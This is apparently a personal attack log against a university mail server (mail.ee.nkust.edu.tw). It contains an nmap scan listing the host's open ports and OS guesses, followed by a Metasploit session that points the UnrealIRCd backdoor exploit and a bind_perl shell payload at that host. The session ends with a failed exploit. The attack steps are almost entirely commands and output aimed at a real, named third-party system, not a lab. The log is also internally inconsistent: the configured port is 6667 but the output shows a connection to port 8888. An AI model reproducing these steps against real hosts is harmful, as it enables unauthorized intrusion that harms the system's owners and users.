### mail.ee.nkust.edu.tw
* nmap
    * sudo nmap -T4 -Pn -O mail.ee.nkust.edu.tw
```
jumbo@raspberrypi:~/notebooks $ sudo nmap -T4 -Pn -O mail.ee.nkust.edu.tw
Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-09 10:57 CST
Nmap scan report for mail.ee.nkust.edu.tw (140.127.114.5)
Host is up (0.016s latency).
Not shown: 975 filtered ports
PORT      STATE  SERVICE
22/tcp    closed ssh
25/tcp    open   smtp
80/tcp    open   http
88/tcp    open   kerberos-sec
110/tcp   open   pop3
113/tcp   closed ident
143/tcp   open   imap
389/tcp   open   ldap
443/tcp   open   https
464/tcp   closed kpasswd5
465/tcp   open   smtps
587/tcp   open   submission
667/tcp   open   disclose
993/tcp   open   imaps
995/tcp   open   pop3s
1024/tcp  open   kdm
1099/tcp  closed rmiregistry
1100/tcp  closed mctp
3071/tcp  closed csd-mgmt-port
3493/tcp  closed nut
8888/tcp  open   sun-answerbook
9999/tcp  closed abyss
34571/tcp closed unknown
34572/tcp closed unknown
34573/tcp closed unknown
Aggressive OS guesses: FreeBSD 6.2-RELEASE (95%), OpenBSD 4.3 (95%), Sony Bravia HX720-series TV (94%), OpenBSD 4.0 (93%), Apple AirPort Extreme WAP (93%), AVM FRITZ!Box FON WLAN 7050, Linksys WAG200G, or Netgear DG834GT wireless broadband router (93%), Netgear ReadyNAS Duo NAS device (RAIDiator 4.1.4) (92%), Kyocera CopyStar CS-2560 printer (91%), Linux 2.6.18 (88%), Linux 2.6.9 (88%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.80 seconds
jumbo@raspberrypi:~/notebooks $ 
```
#### attack
* msfconsole
* use exploit/unix/irc/unreal_ircd_3281_backdoor
* set payload cmd/unix/bind_perl
* set RHOST mail.ee.nkust.edu.tw
* show options
```
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options

Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):

   Name    Current Setting       Required  Description
   ----    ---------------       --------  -----------
   RHOSTS  mail.ee.nkust.edu.tw  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   6667                  yes       The target port (TCP)


Payload options (cmd/unix/bind_perl):

   Name   Current Setting       Required  Description
   ----   ---------------       --------  -----------
   LPORT  4444                  yes       The listen port
   RHOST  mail.ee.nkust.edu.tw  no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) >
```
* exploit
```
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[*] 140.127.114.5:8888 - Connected to 140.127.114.5:8888...
[-] 140.127.114.5:8888 - Exploit failed: EOFError EOFError
[*] Exploit completed, but no session was created.
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) >
```
